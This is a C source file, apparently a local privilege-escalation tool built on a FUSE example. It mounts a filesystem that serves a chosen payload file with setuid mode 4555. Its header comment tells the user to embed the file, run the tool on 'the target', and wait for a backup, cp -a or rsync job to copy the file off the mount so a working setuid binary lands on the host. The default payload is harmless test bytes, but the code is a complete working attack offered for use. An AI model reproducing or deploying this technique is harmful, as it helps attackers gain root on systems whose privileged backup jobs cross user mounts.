/*
  FUSE: Filesystem in Userspace
  Copyright (C) 2001-2007  Miklos Szeredi <miklos@szeredi.hu>

  This program can be distributed under the terms of the GNU GPL.

  1. Replace the payload variable with the hex encoded contents of your file.
  2. Replace the payload_len variable with the file size in bytes
  3. Compile to match target os
  4. Execute the binary on the target, passing a directory to mount to

  The file will have it's mode set to 4555, but fuse prevents actual exploitation.
  You will have to find a backup, cp -a, or rsync type of function that passes over the mount point.i
  Then reverse the process, or restore while unmounted to get a working 4555 file.

  The defailt payload is just a binary file showing that there isn't any bad bytes.

  gcc -Wall `pkg-config fuse --cflags --libs` fusefs.c -o fusefs
*/

#define FUSE_USE_VERSION 26

#include <fuse.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <stdlib.h>

static const char *payload = "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff";
static const size_t payload_len = 256;
static const char *suid_path = "/payload";

static int suidfs_getattr(const char *path, struct stat *stbuf)
{
	int res = 0;

	memset(stbuf, 0, sizeof(struct stat));
	if (strcmp(path, "/") == 0) {
		stbuf->st_mode = S_IFDIR | 0555;
		stbuf->st_nlink = 2;
	} else if (strcmp(path, suid_path) == 0) {
		stbuf->st_mode = S_IFREG | 04555;
		stbuf->st_nlink = 1;
		stbuf->st_size = payload_len;
	} else
		res = -ENOENT;

	return res;
}

static int suidfs_readdir(const char *path, void *buf, fuse_fill_dir_t filler,
			 off_t offset, struct fuse_file_info *fi)
{
	(void) offset;
	(void) fi;

	if (strcmp(path, "/") != 0)
		return -ENOENT;

	filler(buf, ".", NULL, 0);
	filler(buf, "..", NULL, 0);
	filler(buf, suid_path + 1, NULL, 0);

	return 0;
}

static int suidfs_open(const char *path, struct fuse_file_info *fi)
{
	if (strcmp(path, suid_path) != 0)
		return -ENOENT;

	if ((fi->flags & 3) != O_RDONLY)
		return -EACCES;

	return 0;
}

static int suidfs_read(const char *path, char *buf, size_t size, off_t offset,
		      struct fuse_file_info *fi)
{
	(void) fi;
	if(strcmp(path, suid_path) != 0)
		return -ENOENT;

	if (offset < payload_len) {
		if (offset + size > payload_len)
			size = payload_len - offset;
		memcpy(buf, payload + offset, size);
	} else
		size = 0;

	return size;
}

static struct fuse_operations suidfs_oper = {
	.getattr	= suidfs_getattr,
	.readdir	= suidfs_readdir,
	.open		= suidfs_open,
	.read		= suidfs_read,
};

int main(int argc, char *argv[])
{
	char *dash_o = "-o";
	char *o_suid = "suid";
	int fuse_argc = argc + 2;
	char **fuse_argv = malloc((argc + 5) * sizeof(*fuse_argv));

	memmove(fuse_argv, argv, sizeof(*fuse_argv) * argc);
	fuse_argv[argc] = dash_o;
	fuse_argv[argc+1] = o_suid;
	fuse_argv[argc+2] = 0;

	return fuse_main(fuse_argc, fuse_argv, &suidfs_oper, NULL);
}
